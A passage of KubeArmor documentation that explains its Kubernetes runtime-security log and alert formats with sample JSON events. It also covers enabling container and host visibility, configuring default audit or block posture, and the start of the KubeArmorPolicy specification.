| Labels            | shows the pod label from where log generated                        | app=discovery-engine                                                              |
| Message           | gives the message specified in the policy                           | Alert! Execution of package management process inside container is denied         |
| NamespaceName     | lists the namespace where pod is running                            | accuknox-agents                                                                   |
| PID               | lists the process ID running in container                           | 1                                                                                 |
| PPID              | lists the Parent process ID running in container                    | 967496                                                                            |
| ParentProcessName | gives the parent process name from where the operation happend      | /usr/bin/containerd-shim-runc-v2                                                  |
| PodName           | lists the pod name where the log got generated                      | mysql-76ddc6ddc4-h47hv                                                            |
| ProcessName       | specifies the operation that happened inside the pod for this log   | /knoxAutoPolicy                                                                   |
| Resource          | lists the resources that was requested                              | //accuknox-obs.db                                                                 |
| Result            | shows whether the event was allowed or denied                       | Passed                                                                            |
| Source            | lists the source from where the operation request came              | /knoxAutoPolicy                                                                   |
| Type              | specifies it as container log                                       | ContainerLog                                                                      |

<details>

<summary><strong>Process Log</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000000",
  "NamespaceName": "default",
  "PodName": "vault-0",
  "Labels": "app.kubernetes.io/instance=vault,app.kubernetes.io/name=vault,component=server,helm.sh/chart=vault-0.24.1,statefulset.kubernetes.io/pod-name=vault-0",
  "ContainerID": "775fb27125ee8d9e2f34d6731fbf3bf677a1038f79fe8134856337612007d9ae",
  "ContainerName": "vault",
  "ContainerImage": "docker.io/hashicorp/vault:1.13.1@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8",
  "ParentProcessName": "/usr/bin/runc",
  "ProcessName": "/bin/sh",
  "HostPPID": 2514065,
  "HostPID": 2514068,
  "PPID": 2514065,
  "PID": 3552620,
  "UID": 100,
  "Type": "ContainerLog",
  "Source": "/usr/bin/runc",
  "Operation": "Process",
  "Resource": "/bin/sh -ec vault status -tls-skip-verify",
  "Data": "syscall=SYS_EXECVE",
  "Result": "Passed"
}
```

</details>

<details>

<summary><strong>File Log</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000000",
  "NamespaceName": "accuknox-agents",
  "PodName": "discovery-engine-6f5c4df7b4-q8zbc",
  "Labels": "app=discovery-engine",
  "ContainerID": "7aca8d52d35ab7872df6a454ca32339386be755d9ed6bd6bf7b37ec6aaf277e4",
  "ContainerName": "discovery-engine",
  "ContainerImage": "docker.io/accuknox/knoxautopolicy:v0.9@sha256:bb83b5c6d41e0d0aa3b5d6621188c284ea99741c3692e34b0f089b0e74745413",
  "ParentProcessName": "/usr/bin/containerd-shim-runc-v2",
  "ProcessName": "/knoxAutoPolicy",
  "HostPPID": 967496,
  "HostPID": 967872,
  "PPID": 967496,
  "PID": 1,
  "Type": "ContainerLog",
  "Source": "/knoxAutoPolicy",
  "Operation": "File",
  "Resource": "/var/run/secrets/kubernetes.io/serviceaccount/token",
  "Data": "syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_CLOEXEC",
  "Result": "Passed"
}
```

</details>

<details>

<summary><strong>Network Log</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000001",
  "NamespaceName": "accuknox-agents",
  "PodName": "policy-enforcement-agent-7946b64dfb-f4lgv",
  "Labels": "app=policy-enforcement-agent",
  "ContainerID": "b597629c9b59304c779c51839e9a590fa96871bdfdf55bfec73b26c9fb7647d7",
  "ContainerName": "policy-enforcement-agent",
  "ContainerImage": "public.ecr.aws/k9v9d5v2/policy-enforcement-agent:v0.1.0@sha256:005c1fde3ff8a667f3ac7540c5c011c752a7e3aaa2c89aa335703289ed8d80f8",
  "ParentProcessName": "/usr/bin/containerd-shim-runc-v2",
  "ProcessName": "/home/pea/main",
  "HostPPID": 1394403,
  "HostPID": 1394554,
  "PPID": 1394403,
  "PID": 1,
  "Type": "ContainerLog",
  "Source": "./main",
  "Operation": "Network",
  "Resource": "sa_family=AF_INET sin_port=53 sin_addr=10.0.0.10",
  "Data": "syscall=SYS_CONNECT fd=10",
  "Result": "Passed"
}
```

</details>

## Container Alerts

Container alerts are generated when there is a policy violation or audit event that is raised due to a policy action. For example, a policy might block execution of a process. When the execution is blocked by KubeArmor enforcer, KubeArmor generates an alert event implying policy action. In the case of an Audit action, the KubeArmor will only generate an alert without actually blocking the action.

The primary difference in the container alerts events vs the telemetry events (showcased above) is that the alert events contains certain additional fields such as policy name because of which the alert was generated and other metadata such as "Tags", "Message", "Severity" associated with the policy rule.

### Container Alerts Fields format

| Alert Field       | Description                                                                          | Example                                                                   |
| ----------------- | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| Action            | specifies the action of the policy it has matched.                                   | Audit/Block                                                               |
| ClusterName       | gives information about the cluster for which the alert was generated                | aks-test-cluster                                                          |
| Operation         | gives details about what type of operation happened in the pod                       | File/Process/Network                                                      |
| ContainerID       | information about the container ID where the policy violation or alert got generated | e10d5edb62ac2daa4eb9a2146e2f2cfa87b6a5f30bd3a                             |
| ContainerImage    | shows the image that was used to spin up the container                               | docker.io/library/mysql:5.6\@sha256:20575ecebe6216036d25dab5903808211f    |
| ContainerName     | specifies the Container name where the alert got generated                           | mysql                                                                     |
| Data              | shows the system call that was invoked for this operation                            | syscall=SYS\_EXECVE                                                       |
| Enforcer          | it specifies the name of the LSM that has enforced the policy                        | AppArmor/BPFLSM                                                           |
| HostName          | shows the node name where the alert got generated                                    | aks-agentpool-16128849-vmss000001                                         |
| HostPID           | gives the host Process ID                                                            | 3647533                                                                   |
| HostPPID          | list the details of host Parent Process ID                                           | 3642706                                                                   |
| Labels            | shows the pod label from where alert generated                                       | app=mysql                                                                 |
| Message           | gives the message specified in the policy                                            | Alert! Execution of package management process inside container is denied |
| NamespaceName     | lists the namespace where pod is running                                             | wordpress-mysql                                                           |
| PID               | lists the process ID running in container                                            | 266                                                                       |
| PPID              | lists the Parent process ID running in container                                     | 251                                                                       |
| ParentProcessName | gives the parent process name from where the operation happend                       | /bin/bash                                                                 |
| PodName           | lists the pod name where the alert got generated                                     | mysql-76ddc6ddc4-h47hv                                                    |
| PolicyName        | gives the policy that was matched for this alert generation                          | harden-mysql-pkg-mngr-exec                                                |
| ProcessName       | specifies the operation that happened inside the pod for this alert                  | /usr/bin/apt                                                              |
| Resource          | lists the resources that was requested                                               | /usr/bin/apt                                                              |
| Result            | shows whether the event was allowed or denied                                        | Permission denied                                                         |
| Severity          | gives the severity level of the operation                                            | 5                                                                         |
| Source            | lists the source from where the operation request came                               | /bin/bash                                                                 |
| Tags              | specifies the list of benchmarks this policy satisfies                               | NIST,NIST\_800-53\_CM-7(4),SI-4,process,NIST\_800-53\_SI-4                |
| Timestamp         | gives the details of the time this event tried to happen                             | 1687868507                                                                |
| Type              | shows whether policy matched or default posture alert                                | MatchedPolicy                                                             |
| UpdatedTime       | gives the time of this alert                                                         | 2023-06-27T12:21:47.932526                                                |
| cluster\_id       | specifies the cluster id where the alert was generated                               | 596                                                                       |
| component\_name   | gives the component which generated this log/alert                                   | kubearmor                                                                 |
| tenant\_id        | specifies the tenant id where this cluster is onboarded in AccuKnox SaaS             | 11                                                                        |

<details>

<summary><strong>Process Alert</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000001",
  "NamespaceName": "wordpress-mysql",
  "PodName": "wordpress-787f45786f-2q9wf",
  "Labels": "app=wordpress",
  "ContainerID": "72de193fc8d849cd052affae5a53a27111bcefb75385635dcb374acdf31a5548",
  "ContainerName": "wordpress",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "HostPPID": 495804,
  "HostPID": 495877,
  "PPID": 309835,
  "PID": 309841,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/usr/bin/apt",
  "PolicyName": "harden-wordpress-pkg-mngr-exec",
  "Severity": "5",
  "Tags": "NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4",
  "ATags": [
    "NIST",
    "NIST_800-53_CM-7(4)",
    "SI-4",
    "process",
    "NIST_800-53_SI-4"
  ],
  "Message": "Alert! Execution of package management process inside container is denied",
  "Type": "MatchedPolicy",
  "Source": "/bin/bash",
  "Operation": "Process",
  "Resource": "/usr/bin/apt",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "Action": "Block",
  "Result": "Permission denied"
}
```

</details>

<details>

<summary><strong>File Alert</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000001",
  "NamespaceName": "wordpress-mysql",
  "PodName": "wordpress-787f45786f-2q9wf",
  "Labels": "app=wordpress",
  "ContainerID": "72de193fc8d849cd052affae5a53a27111bcefb75385635dcb374acdf31a5548",
  "ContainerName": "wordpress",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "HostPPID": 495804,
  "HostPID": 496390,
  "PPID": 309835,
  "PID": 309842,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/bin/rm",
  "PolicyName": "harden-wordpress-file-integrity-monitoring",
  "Severity": "1",
  "Tags": "NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation",
  "ATags": [
    "NIST",
    "NIST_800-53_AU-2",
    "NIST_800-53_SI-4",
    "MITRE",
    "MITRE_T1036_masquerading",
    "MITRE_T1565_data_manipulation"
  ],
  "Message": "Detected and prevented compromise to File integrity",
  "Type": "MatchedPolicy",
  "Source": "/bin/rm /sbin/raw",
  "Operation": "File",
  "Resource": "/sbin/raw",
  "Data": "syscall=SYS_UNLINKAT flags=",
  "Enforcer": "AppArmor",
  "Action": "Block",
  "Result": "Permission denied"
}
```

</details>

<details>

<summary><strong>Network Alert</strong></summary>

```json
{
  "ClusterName": "default",
  "HostName": "aks-agentpool-16128849-vmss000000",
  "NamespaceName": "default",
  "PodName": "vault-0",
  "Labels": "app.kubernetes.io/instance=vault,app.kubernetes.io/name=vault,component=server,helm.sh/chart=vault-0.24.1,statefulset.kubernetes.io/pod-name=vault-0",
  "ContainerID": "775fb27125ee8d9e2f34d6731fbf3bf677a1038f79fe8134856337612007d9ae",
  "ContainerName": "vault",
  "ContainerImage": "docker.io/hashicorp/vault:1.13.1@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8",
  "HostPPID": 2203523,
  "HostPID": 2565259,
  "PPID": 2203523,
  "PID": 3558570,
  "UID": 100,
  "ParentProcessName": "/usr/bin/containerd-shim-runc-v2",
  "ProcessName": "/bin/vault",
  "PolicyName": "ksp-vault-network",
  "Severity": "8",
  "Type": "MatchedPolicy",
  "Source": "/bin/vault status -tls-skip-verify",
  "Operation": "Network",
  "Resource": "domain=AF_UNIX type=SOCK_STREAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0",
  "Data": "syscall=SYS_SOCKET",
  "Enforcer": "eBPF Monitor",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

## Host Alerts

The fields are self-explanatory and have similar meaning as in the context of container based events (explained above).

<details>

<summary><strong>Process Alert</strong></summary>

```json
{
  "Timestamp": 1692813948,
  "UpdatedTime": "2023-08-23T18:05:48.301798Z",
  "ClusterName": "default",
  "HostName": "gke-my-first-cluster-1-default-pool-9144db50-81gb",
  "HostPPID": 1979,
  "HostPID": 1787227,
  "PPID": 1979,
  "PID": 1787227,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/bin/sleep",
  "PolicyName": "sleep-deny",
  "Severity": "5",
  "Type": "MatchedHostPolicy",
  "Source": "/bin/bash",
  "Operation": "Process",
  "Resource": "/usr/bin/sleep 10",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "BPFLSM",
  "Action": "Block",
  "Result": "Permission denied"
}
```

</details>

<details>

<summary><strong>Blocked SETGID</strong></summary>

Note that KubeArmor also alerts events blocked due to other system policy enforcement. For example, if an SELinux native rule blocks an action, KubeArmor will report those as well as `DefaultPosture` events. Following is an example of such event:

```json
{
  "Timestamp": 1692814089,
  "UpdatedTime": "2023-08-23T18:08:09.522743Z",
  "ClusterName": "default",
  "HostName": "gke-my-first-cluster-1-default-pool-9144db50-81gb",
  "HostPPID": 1791315,
  "HostPID": 1791316,
  "PPID": 1791315,
  "PID": 1791316,
  "UID": 204,
  "ParentProcessName": "/usr/sbin/sshd",
  "ProcessName": "/usr/sbin/sshd",
  "PolicyName": "DefaultPosture",
  "Type": "MatchedHostPolicy",
  "Source": "/usr/sbin/sshd",
  "Operation": "Syscall",
  "Data": "syscall=SYS_SETGID userid=0",
  "Enforcer": "BPFLSM",
  "Action": "Block",
  "Result": "Operation not permitted"
}
```

</details>

<details>

<summary><strong>Blocked SETUID</strong></summary>

Note that KubeArmor also alerts events blocked due to other system policy enforcement. For example, if an SELinux native rule blocks an action, KubeArmor will report those as well as `DefaultPosture` events. Following is an example of such event:

```json
{
  "Timestamp": 1692814089,
  "UpdatedTime": "2023-08-23T18:08:09.523964Z",
  "ClusterName": "default",
  "HostName": "gke-my-first-cluster-1-default-pool-9144db50-81gb",
  "HostPPID": 1791315,
  "HostPID": 1791316,
  "PPID": 1791315,
  "PID": 1791316,
  "UID": 204,
  "ParentProcessName": "/usr/sbin/sshd",
  "ProcessName": "/usr/sbin/sshd",
  "PolicyName": "DefaultPosture",
  "Type": "MatchedHostPolicy",
  "Source": "/usr/sbin/sshd",
  "Operation": "Syscall",
  "Data": "syscall=SYS_SETUID userid=0",
  "Enforcer": "BPFLSM",
  "Action": "Block",
  "Result": "Operation not permitted"
}
```

</details>

# Control Telemetry/Visibility

KubeArmor currently supports enabling visibility for containers and hosts.

Visibility for hosts is not enabled by default, however it is enabled by default for containers .

The `karmor` tool provides access to both using `karmor logs`.

<details>

<summary>Available visibility options:</summary>

**KubeArmor provides visibility on the following behavior of containers**

* Process
* Files
* Networks

</details>

### Prerequisites

* If you don't have access to a K8s cluster, please follow [this](https://docs.kubearmor.io/kubearmor/quick-links/deployment_guide#prerequisites) to set one up.
* karmor CLI tool: [Download and install karmor-cli](https://docs.kubearmor.io/kubearmor/quick-links/deployment_guide#1-download-and-install-karmor-cli-tool)

### Example: wordpress-mysql

* To deploy [wordpress-mysql](https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml) app follow [this](https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql.md)
* Now we need to deploy some sample policies

```
kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/security-policies/ksp-wordpress-block-process.yaml
```

This sample policy blocks execution of the `apt` and `apt-get` commands in wordpress pods with label selector `app: wordpress`.

### Getting Container Visibility

* Checking default visibility

  * Container visibility is enabled by default. We can check it using `kubectl describe` and grep `kubearmor-visibility`

  ```
  POD_NAME=$(kubectl get pods -n wordpress-mysql -l app=wordpress -o jsonpath='{.items[0].metadata.name}') && kubectl describe -n wordpress-mysql pod $POD_NAME | grep kubearmor-visibility

  kubearmor-visibility: process, file, network, capabilities
  ```

  * **For pre-existing workloads :** Enable visibility using `kubectl annotate`. Currently KubeArmor supports `process`, `file`, `network`, `capabilities`

  ```
  kubectl annotate pods <pod-name> -n wordpress-mysql "kubearmor-visibility=process,file,network,capabilities"
  ```

* Open up a terminal, and watch logs using the `karmor` cli

  ```
  karmor logs
  ```

* In another terminal, simulate a policy violation . Try `sleep` inside a pod

  ```
  POD_NAME=$(kubectl get pods -n wordpress-mysql -l app=wordpress -o jsonpath='{.items[0].metadata.name}') && kubectl -n wordpress-mysql exec -it $POD_NAME -- bash
  # apt update
  ```

* In the terminal running `karmor logs`, the policy violation along with container visibility is shown, in this case for example
* The logs can also be generated in JSON format using `karmor logs --json`

### Getting Host Visibility

* Host Visibility is not enabled by default . To enable Host Visibility we need to annotate the node using `kubectl annotate node`

```
  kubectl annotate node <node-name> "kubearmor-visibility=process,file,network,capabilities" 
```

* To confirm it use `kubectl describe` and grep `kubearmor-visibility`

```
kubectl describe node <node-name> | grep kubearmor-visibility
```

* Now we can get general telemetry events in the context of the host using `karmor logs` .The logs related to Host Visibility will have type `Type: HostLog`and `Operation: File | Process | Network`

```
karmor logs --logFilter=all
```

<details>

<summary>Click to expand</summary>

```
== Alert / 2023-01-04 04:58:37.689182 ==
== Log / 2023-01-27 14:41:49.017709 ==
ClusterName: default
HostName: kubearmor-dev2
Type: HostLog
Source: /usr/bin/dockerd
Resource: /usr/bin/runc --version
Operation: Process
Data: syscall=SYS_EXECVE
Result: Passed
HostPID: 193088
HostPPID: 914
PID: 193088
PPID: 914
ParentProcessName: /usr/bin/dockerd
ProcessName: /usr/bin/runc
== Log / 2023-01-27 14:41:49.018951 ==
ClusterName: default
HostName: kubearmor-dev2
Type: HostLog
Source: /usr/bin/runc --version
Resource: /lib/x86_64-linux-gnu/libc.so.6
Operation: File
Data: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_CLOEXEC
Result: Passed
HostPID: 193088
HostPPID: 914
PID: 193088
PPID: 914
ParentProcessName: /usr/bin/dockerd
ProcessName: /usr/bin/runc
== Log / 2023-01-27 14:41:49.018883 ==
ClusterName: default
HostName: kubearmor-dev2
Type: HostLog
Source: /usr/bin/runc --version
Resource: /etc/ld.so.cache
Operation: File
Data: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_CLOEXEC
Result: Passed
HostPID: 193088
HostPPID: 914
PID: 193088
PPID: 914
ParentProcessName: /usr/bin/dockerd
ProcessName: /usr/bin/runc
== Log / 2023-01-27 14:41:49.020905 ==
ClusterName: default
HostName: kubearmor-dev2
Type: HostLog
Source: /var/lib/rancher/k3s/data/2949af7261ce923f6a5091396d266a0e9d9436dcee976fcd548edc324eb277bb/bin/k3s
Resource: /var/lib/rancher/k3s/data/2949af7261ce923f6a5091396d266a0e9d9436dcee976fcd548edc324eb277bb/bin/portmap
Operation: Process
Data: syscall=SYS_EXECVE
Result: Passed
HostPID: 193090
HostPPID: 5627
PID: 193090
PPID: 5627
ParentProcessName: /var/lib/rancher/k3s/data/2949af7261ce923f6a5091396d266a0e9d9436dcee976fcd548edc324eb277bb/bin/k3s
ProcessName: /var/lib/rancher/k3s/data/2949af7261ce923f6a5091396d266a0e9d9436dcee976fcd548edc324eb277bb/bin/portmap

```

* The logs can also be generated in JSON format using `karmor logs --logFilter=all --json`

</details>

### Updating Namespace Visibility

KubeArmor has the ability to let the user select what kind of events have to be traced by changing the annotation `kubearmor-visibility` at the namespace.

* Checking Namespace visibility

  * Namespace visibility can be checked using `kubectl describe`.

  ```
  kubectl describe ns wordpress-mysql | grep kubearmor-visibility

  kubearmor-visibility: process, file, network, capabilities
  ```

  * **To update the visibility of namespace :** Now let's update Kubearmor visibility using `kubectl annotate`. Currently KubeArmor supports `process`, `file`, `network`, `capabilities`.\
    Lets try to update visibility for the namespace `wordpress-mysql`

  ```
   kubectl annotate ns wordpress-mysql kubearmor-visibility=network --overwrite
   "namespace/wordpress-mysql annotated"

  ```

  > Note: To turn off the visibility across all aspects, use `kubearmor-visibility=none`. Note that any policy violations or events that results in non-success returns would still be reported in the logs.
* Open up a terminal, and watch logs using the `karmor` cli

  ```
  karmor logs --logFilter=all -n wordpress-mysql

  ```

* In another terminal, let's exec into the pod and run some process commands . Try `ls` inside the pod

  ```
    POD_NAME=$(kubectl get pods -n wordpress-mysql -l app=wordpress -o jsonpath='{.items[0].metadata.name}') && kubectl -n wordpress-mysql exec -it $POD_NAME -- bash
  # ls
  ```

  Now, we can notice that no logs have been generated for the above command and logs with only `Operation: Network` are shown.

  > **Note** If telemetry is disabled, the user wont get audit event even if there is an audit rule.

  > **Note** Only the logs are affected by changing the visibility, we still get all the alerts that are generated.
* Let's simulate a sample policy violation, and see whether we still get alerts or not.

  * **Policy violation :**

  ```
  POD_NAME=$(kubectl get pods -n wordpress-mysql -l app=wordpress -o jsonpath='{.items[0].metadata.name}') && kubectl -n wordpress-mysql exec -it $POD_NAME -- bash
  #apt 
  ```

  Here, note that the alert with `Operation: Process` is reported.

# Security Posture

KubeArmor supports configurable default security posture. The security posture could be allow/audit/deny. Default Posture is used when there's atleast one `Allow` policy for the given deployment i.e. KubeArmor is handling policies in whitelisting manner (more about this in [Considerations in Policy Action](https://github.com/kubearmor/KubeArmor/blob/event-auditor/getting-started/consideration_in_policy_action.md) ).

There are two default mode of operations available `block` and `audit`. `block` mode blocks all the operations that are not allowed in the policy. `audit` generates telemetry events for operations that would have been blocked otherwise.

KubeArmor has 4 types of resources: Process, File, Network and Capabilities. Default Posture is configurable for each of the resources seperately except Process. Process based operations are treated under File resource only.

## Configuring Default Posture

### Global Default Posture

> **Note** By default, KubeArmor set the Global default posture to `audit`

Global default posture is configured using configuration options passed to KubeArmor using configuration file

```yaml
defaultFilePosture: block # or audit
defaultNetworkPosture: block # or audit
defaultCapabilitiesPosture: block # or audit
```

Or using command line flags with the KubeArmor binary

```sh
  -defaultFilePosture string
     configuring default enforcement action in global file context [audit,block] (default "block")
  -defaultNetworkPosture string
     configuring default enforcement action in global network context [audit,block] (default "block")
  -defaultCapabilitiesPosture string
     configuring default enforcement action in global capability context [audit,block] (default "block")
```

### Namespace Default Posture

We use namespace annotations to configure default posture per namespace. Supported annotations keys are `kubearmor-file-posture`,`kubearmor-network-posture` and `kubearmor-capabilities-posture` with values `block` or `audit`. If a namespace is annotated with a supported key and an invalid value ( like `kubearmor-file-posture=invalid`), KubeArmor will update the value with the global default posture ( i.e. to `kubearmor-file-posture=block`).

## Example

Let's start KubeArmor with configuring default network posture to audit in the following YAML.

```sh
 sudo env KUBEARMOR_CFG=/path/to/kubearmor.yaml ./kubearmor
```

Contents of `kubearmor.yaml`

```yaml
defaultNetworkPosture: audit
```

Here's a sample policy to allow `tcp` connections from `curl` binary.

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-ubuntu-5-net-tcp-allow-curl
  namespace: multiubuntu
spec:
  severity: 8
  selector:
    matchLabels:
      container: ubuntu-5
  network:
    matchProtocols:
    - protocol: tcp
      fromSource:
      - path: /usr/bin/curl
  action:
    Allow
```

> Note: This example is in the [multiubuntu](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu.md) environment.

Inside the `ubuntu-5-deployment`, if we try to access `tcp` using `curl`. It works as expected with no telemetry generated.

```sh
root@ubuntu-5-deployment-7778f46c67-hk6k6:/# curl 142.250.193.46
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
```

If we try to access `udp` using `curl`, a bunch of telemetry is generated for the `udp` access.

```sh
root@ubuntu-5-deployment-7778f46c67-hk6k6:/# curl google.com
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
```

> `curl google.com` requires UDP for DNS resolution.

Generated alert has Policy Name `DefaultPosture` and Action as `Audit`

```sh
== Alert / 2022-03-21 12:56:32.999475 ==
Cluster Name: default
Host Name: kubearmor-dev-all
Namespace Name: multiubuntu
Pod Name: ubuntu-5-deployment-7778f46c67-hk6k6
Container ID: 1f92eb4c9d730862174be04f319763a2c1ac2752669807051c42ddc78aa102d1
Container Name: ubuntu-5-container
Policy Name: DefaultPosture
Type: MatchedPolicy
Source: /usr/bin/curl google.com
Operation: Network
Resource: domain=AF_INET6 type=SOCK_DGRAM protocol=0
Data: syscall=SYS_SOCKET
Action: Audit
Result: Passed
```

Now let's update the default network posture to block for `multiubuntu` namespace.

```sh
~❯❯❯  kubectl annotate ns multiubuntu kubearmor-network-posture=block
namespace/multiubuntu annotated
```

Now if we try to access `udp` using `curl`, the action is blocked and related alerts are generated.

```sh
root@ubuntu-5-deployment-7778f46c67-hk6k6:/# curl google.com
curl: (6) Could not resolve host: google.com
```

Here curl couldn't resolve google.com due to blocked access to UDP.

Generated alert has Policy Name `DefaultPosture` and Action as `Block`

```
== Alert / 2022-03-21 13:06:27.731918 ==
Cluster Name: default
Host Name: kubearmor-dev-all
Namespace Name: multiubuntu
Pod Name: ubuntu-5-deployment-7778f46c67-hk6k6
Container ID: 1f92eb4c9d730862174be04f319763a2c1ac2752669807051c42ddc78aa102d1
Container Name: ubuntu-5-container
Policy Name: ksp-ubuntu-5-net-tcp-allow
Severity: 8
Type: MatchedPolicy
Source: /usr/bin/curl google.com
Operation: Network
Resource: domain=AF_INET6 type=SOCK_DGRAM protocol=0
Data: syscall=SYS_SOCKET
Action: Allow
Result: Permission denied
```

Let's try to set the annotation value to something invalid.

```
~❯❯❯  kubectl annotate ns multiubuntu kubearmor-network-posture=invalid --overwrite
namespace/multiubuntu annotated
~❯❯❯  kubectl describe ns multiubuntu
Name:         multiubuntu
Labels:       kubernetes.io/metadata.name=multiubuntu
Annotations:  kubearmor-network-posture: audit
Status:       Active
```

We can see that, annotation value was automatically updated to audit since that was global mode of operation for network in the KubeArmor configuration.

# Policy Spec for Containers

## Policy Specification

Here is the specification of a security policy.

```
apiVersion: security.kubearmor.com/v1
kind:KubeArmorPolicy
metadata:
  name: [policy name]
  namespace: [namespace name]

spec:
  severity: [1-10]                         # --> optional 
  tags: ["tag", ...]                       # --> optional
  message: [message]                       # --> optional

  selector:
    matchLabels:
      [key1]: [value1]
      [keyN]: [valueN]
    matchExpressions:
      - key: [label]
        operator: [In|NotIn]
        values:
          - [labels]

  process:
    matchPaths:
    - path: [absolute executable path]
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      ownerOnly: [true|false]              # --> optional

  file:
    matchPaths:
    - path: [absolute file path]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional

  network:
    matchProtocols:
    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]
      fromSource:                          # --> optional
      - path: [absolute exectuable path]

  capabilities:
    matchCapabilities:
    - capability: [capability name]
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
  
  syscalls:
    matchSyscalls:
    - syscall:
      - syscallX
      - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional
    matchPaths:
    - path: [absolute directory path | absolute exectuable path]
      recursive: [true|false]                # --> optional
      - syscall:
        - syscallX
        - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional

  action: [Allow|Audit|Block] (Block by default)
```

> **Note** Please note that for system calls monitoring we only support audit action no matter what the value of action is

For better understanding, you can check [the KubeArmorPolicy spec diagram](https://github.com/kubearmor/KubeArmor/blob/main/.gitbook/assets/kubearmorpolicy-spec-diagram.pdf).

## Policy Spec Description

Now, we will briefly explain how to define a security policy.

### Common

A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy.

```
  apiVersion: security.kubearmor.com/v1
  kind:KubeArmorPolicy
  metadata:
    name: [policy name]
    namespace: [namespace name]
```

### Severity

The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.

```
severity: [1-10]
```

### Tags

The tags part is optional. You can define multiple tags (e.g., WARNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies.

```
tags: ["tag1", ..., "tagN"]
```

### Message

The message part is optional. You can add an alert message, and then the message will be presented in alert logs.

```
message: [message]
```

### Selector

#### MatchLabels

The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) pods based on labels.

```
  selector:
    matchLabels:
      [key1]: [value1]
      [keyN]: [valueN]
```

#### MatchExpressions

Further in selector we can use `matchExpressions` to define labels to select/deselect the workloads. Currently, only labels can be matched, so the key should be 'label'. The operator will determine whether the policy should apply to the workloads specified in the values field or not.

Operator: In\
When the operator is set to In, the policy will be applied only to the workloads that match the labels in the values field.

Operator: NotIn\
When the operator is set to NotIn, the policy will be applied to all the workloads except that match the labels in the values field.

```
  selector:
    matchExpressions:              
      - key: label
        operator: [In|NotIn]
        values:
        - [label]       # string format eg. -> (app=nginx)
```

> **NOTE** Both `matchExpressions` and `matchLabel` are an ANDed operation.

### Process

In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, the coverage of regular expressions is highly dependent on AppArmor ([Policy Core Reference](https://gitlab.com/apparmor/apparmor/-/wikis/AppArmor_Core_Policy_Reference)). Thus, we generally do not recommend using this match.

```
  process:
    matchPaths:
    - path: [absolute executable path]
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute executable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]            # --> optional
